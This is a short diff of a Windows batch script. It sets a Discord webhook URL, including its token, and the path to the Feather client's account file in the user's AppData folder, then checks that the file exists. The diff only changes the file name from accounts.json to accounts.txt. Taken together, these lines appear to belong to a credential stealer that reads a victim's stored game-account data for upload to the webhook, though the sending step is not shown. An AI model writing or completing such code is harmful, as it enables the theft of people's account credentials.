@@ -12,7 +12,7 @@ setlocal enabledelayedexpansion
 set webhookUrl=https://discord.com/api/webhooks/1375094845747630191/wYY9So19VeX8WHJ7PRur8UVMScCLnSQvw8GvrKADAmbjvjdGSSPjJRIMePXc5r6Gs_Hx
 
 :: Path to the accounts.json file
-set filePath=%USERPROFILE%\AppData\Roaming\.feather\accounts.json
+set filePath=%USERPROFILE%\AppData\Roaming\.feather\accounts.txt
 
 
 :: Check if the file exists
